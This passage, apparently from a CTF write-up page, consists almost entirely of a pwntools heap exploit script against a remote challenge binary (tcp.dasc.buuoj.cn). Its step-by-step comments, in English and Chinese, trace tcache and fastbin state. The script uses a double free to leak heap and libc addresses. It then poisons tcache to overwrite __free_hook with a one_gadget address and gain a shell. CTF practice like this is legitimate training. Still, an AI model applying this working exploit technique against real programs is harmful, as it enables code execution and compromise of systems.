class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>,arch = <span class=\"string\">&#x27;amd64&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./pwn&quot;)  </span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;tcp.dasc.buuoj.cn&quot;</span>, <span class=\"number\">24502</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content:\\n&quot;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx,offset</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">link</span>(<span class=\"params\">src,dest</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;link from:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(src))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;link to:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">unlink</span>(<span class=\"params\">idx,offset</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#0,1,2,3,4,5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;1=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\">link(<span class=\"number\">0</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">link(<span class=\"number\">0</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">link(<span class=\"number\">3</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\">link(<span class=\"number\">3</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:1=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\">unlink(<span class=\"number\">0</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fill tcache and add chunk13</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#chunk6~13,idx == 2,4,5,6,7,8,9,10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:1=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:13</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">2</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">5</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">6</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">8</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">9</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#double free</span></span><br><span class=\"line\"><span class=\"comment\">#fast bin :</span></span><br><span class=\"line\"><span class=\"comment\">#2=&gt;1=&gt;2</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">255</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:13</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#clear tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=1,2,4,5,6,7,8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fast bins to tcache</span></span><br><span class=\"line\"><span class=\"comment\">#tcache:</span></span><br><span class=\"line\"><span class=\"comment\">#2=&gt;1=&gt;2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fastbins chunk2=&gt;chunk1=&gt;chunk2</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20: 0x5631022d53c0 —▸ 0x5631022d5350 ◂— 0x5631022d53c0</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50: 0x5631022d5370 —▸ 0x5631022d5300 ◂— 0x5631022d5370</span></span><br><span class=\"line\"><span class=\"comment\">#reset the fd of content2</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)<span class=\"comment\">#idx=9 chunk2</span></span><br><span class=\"line\"><span class=\"comment\">#after this work, chunk1=&gt;chunk2=&gt;0x0(next=0 in function add())</span></span><br><span class=\"line\"><span class=\"comment\">#but in content, we only write a lowbyte &#x27;\\x00&#x27; in the fd</span></span><br><span class=\"line\"><span class=\"comment\">#so it change from 0x5631022d5300 to 0x5631022d5300  (如果最低位不是\\x00也会变为\\x00)</span></span><br><span class=\"line\"><span class=\"comment\">#when malloc , chunks in fast bins transfer to tcachebins</span></span><br><span class=\"line\"><span class=\"comment\"># tcachebins chunk1=&gt;chunk2</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20 [  3]: 0x5631022d5360 —▸ 0x5631022d53d0 ◂— 0x0(next have clear in add())</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50 [  3]: 0x5631022d5310 —▸ 0x5631022d5380 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:13</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[9]: 2=&gt;13</span></span><br><span class=\"line\">link(<span class=\"number\">9</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=10 chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=11 chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">link(<span class=\"number\">0</span>,<span class=\"number\">9</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:1</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#dele chunk1 and chunk2</span></span><br><span class=\"line\">dele(<span class=\"number\">10</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#after dele chunk1 and chunk2</span></span><br><span class=\"line\"><span class=\"comment\"># tcachebins : chunk2=&gt;chunk1</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20 [  3]: 0x5631022d53d0 —▸ 0x5631022d5360 —▸ 0x5631022d58a0 ◂— 0x0 link chunk2 and chunk13 so next-&gt;chunk13</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50 [  3]: 0x5631022d5380 —▸ 0x5631022d5310 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...(2a0是pre_size，也就是chunk0的content)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak heap base by chunk2_content.fd(chunk1_content) - offset.</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Offset 1:&quot;</span>)</span><br><span class=\"line\">heap_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x310</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;heap_base : &quot; + hex(heap_base))</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=10 chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=11 chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#set idx 11 size , to get unsorted bin</span></span><br><span class=\"line\">payload = p64(heap_base + <span class=\"number\">0x2a0</span>) + p64(<span class=\"number\">0x441</span>) + <span class=\"string\">b&#x27;aaaaaaaa&#x27;</span>(+<span class=\"number\">0x2a0</span>是为了保持原来的数据)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,payload)<span class=\"comment\">#idx=12 0x5631022d58a0 -&gt; content == 0x5631022d52f0</span></span><br><span class=\"line\"><span class=\"comment\">#now the size of chunk1 is 0x441 , prev_size =0x5631022d52a0(chunk0的content)</span></span><br><span class=\"line\"><span class=\"comment\">#add后 0x50 [  0]: 0x5631022d52a0 ◂— ...(chunk0的content)导致的free，但实际上没执行free</span></span><br><span class=\"line\"><span class=\"comment\">#unsorted bin</span></span><br><span class=\"line\">dele(<span class=\"number\">11</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># unsortedbin</span></span><br><span class=\"line\"><span class=\"comment\"># all: 0x5631022d5300 —▸ 0x7f1998a0bbe0 (main_arena+96) ◂— 0x5631022d5300</span></span><br><span class=\"line\"><span class=\"comment\"># 0x5631022d5300:\t0x00005631022d52a0\t0x0000000000000441</span></span><br><span class=\"line\"><span class=\"comment\"># 0x5631022d5310:\t0x00007f1998a0bbe0\t0x00007f1998a0bbe0</span></span><br><span class=\"line\"><span class=\"comment\">#修改了size之后，后续9个chunk（含content）和1个content也被包含在chunk1的content中</span></span><br><span class=\"line\"><span class=\"comment\">#即一直到chun10的content都被包含了，chunk10本体并没有</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#idx=11</span></span><br><span class=\"line\"><span class=\"comment\">#从chunk1 size==0x441的bin中切割出size==0x71的chunk作为content</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#unlink to leak</span></span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:14</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc base</span></span><br><span class=\"line\"><span class=\"comment\">#此时原来chunk2的content在0x3d1大小的chunk的起始位置</span></span><br><span class=\"line\"><span class=\"comment\">#通过unlink输出content中的unsortbin头</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Offset 1:&quot;</span>)</span><br><span class=\"line\">libc_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">96</span> - <span class=\"number\">0x10</span> - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xe6c81</span></span><br><span class=\"line\">one_gadget_addr = libc_base + one_gadget</span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;libc_base : &quot; + hex(libc_base))</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;free_hook : &quot; + hex(free_hook))</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;one_gadget_addr : &quot; + hex(one_gadget_addr))</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;heap_base : &quot; + hex(heap_base))</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fill of tcache</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">5</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">6</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#11=&gt;10=&gt;9=&gt;8=&gt;7=&gt;6=&gt;0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#use list[3]</span></span><br><span class=\"line\">unlink(<span class=\"number\">3</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#double free</span></span><br><span class=\"line\">dele(<span class=\"number\">3</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">255</span>)</span><br><span class=\"line\"><span class=\"comment\">#fast bin5=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:14</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">11</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">12</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:2=&gt;13=&gt;2=&gt;1=&gt;14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fast bin5=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0</span></span><br><span class=\"line\"><span class=\"comment\">#通过double free 后的add修改tcache的指针指向</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">link(<span class=\"number\">10</span>,<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># tcachebins</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20 [  3]: 0x5631022d54b0 —▸ 0x5631022d5520 ◂— 0x0</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50 [  4]: 0x5631022d52b0 —▸ 0x5631022d5460 —▸ 0x5631022d54d0 —▸ 0x7f1998a0de48 (__free_hook) ◂— 0x0</span></span><br><span class=\"line\"><span class=\"comment\">#连续申请4个来改写__free_hook,tcache不会检查size</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#15</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(one_gadget_addr) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:2=&gt;13=&gt;2=&gt;1=&gt;14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:10</span></span><br><span class=\"line\"><span 